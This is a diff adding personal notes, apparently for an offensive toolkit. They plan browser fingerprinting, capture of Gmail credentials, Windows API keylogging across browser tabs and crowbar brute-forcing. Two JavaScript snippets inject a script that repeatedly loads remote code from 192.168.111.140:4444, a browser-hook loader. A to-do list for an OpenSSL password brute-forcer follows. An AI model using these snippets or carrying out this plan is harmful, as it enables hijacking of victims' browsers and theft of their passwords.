@@ -1,0 +1,44 @@
+1. identify browser
+2. enhance script to bypass checks
+3. context - use-case: user enter gmail - password credential
+4. vpn - capture credential (keylog) - windows api to capture keystroke
+5. keylog other browser tabs
+6. openssl brute-force crowbar
+
+var script = document.createElement("script");
+script.innerHTML = "setInterval(function(){with(document)body.appendChild(createElement('script')).src='//192.168.111.140:4444'},999)";
+document.body.appendChild(script);
+
+
+var script = document.createElement("script").src='//192.168.111.140:4444';
+document.body.appendChild(script);
+
+It takes 1min30s to brute force 10000 passwords with 4 threads (max) for password list.
+My code is not efficient, brute force hundred+ for true brute-force.
+
+
+Things to do:
+/Test other ciphers/message digests
+/Brute force with default charkeys
+/Additional features like min, max length, beginning wif, ending wif, define specific charkeys to iterate thru
+/Create a random filename generator to avoid tempering with the same file
+/Additional flexibility - list of ciphers to use, list of digests to use
+/Extra informations - Calculate number of iterations required, display real-time progress
+/For .txt file, check if most characters are 90% ASCII printable (actually characters and not some gibberish)
+/Modify password brute-force algorithm to be more efficient (It is about 7-10% more efficient)	
+/Test custom charset
+/Checks for duplicates in cipher/digest lists and remove them
+/Allow multi-word passwords
+/Work with private/public key
+/Display cipher/digest used when successfully found a password (not just display password only)
+
+
+#Real-life scenario, HTTPS
+/Know how the hash and cipher function works
+Study on cryptographic concepts, key exchanges, etc.
+Able to make use of minimum, maximum, beginwith, endwith to filter password lists
+Regex charset * Difficult when striving for efficiency *
+	- Brute-force all password as usual and check against regex * easy *
+	- Example: Check aaaaaaaa, aaaaaaab, aaaaaaac, ... matches "[A-Z]{3}[0-9]{3}[a-zA-Z]{2}" before send to test
+	- Brute-force all password as accordance to regex * difficult *
+	- Example: "[A-Z]{3}[0-9]{3}[a-zA-Z]{2}" generates AAA000aa, AAA000ab, AAA000ac, ... and send to test
